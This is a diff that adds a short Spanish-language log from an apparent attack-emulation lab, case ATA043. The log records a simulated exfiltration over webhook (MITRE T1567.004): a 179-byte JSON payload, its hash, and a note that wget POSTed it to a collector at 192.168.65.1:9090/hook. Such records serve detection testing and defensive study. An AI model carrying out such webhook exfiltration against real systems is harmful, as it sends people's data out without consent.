@@ -1,0 +1,11 @@
+ATA043 · T1567.004 Exfiltration Over Webhook (wget POST JSON a /hook) — custom
+T0=2026-11-24T01:55:31Z
+--- PAYLOAD JSON (a enviar) ---
+1b28889aee458c4f2c8a8053220383815a1ca5347be73e731ffdaee3ffdbe997  /home/angel/lab-attack/ATA043/webhook_payload.json
+bytes_payload=179
+POST /hook -> OK
+sha256 enviado (json) = 1b28889aee458c4f2c8a8053220383815a1ca5347be73e731ffdaee3ffdbe997
+--- estado final ---
+-rw-r--r-- 1 angel angel 179 Nov 24 02:55 /home/angel/lab-attack/ATA043/webhook_payload.json
+WEBHOOK=OK (payload JSON enviado a http://192.168.65.1:9090/hook)
+T1_LOCAL=2026-11-24T01:55:32Z
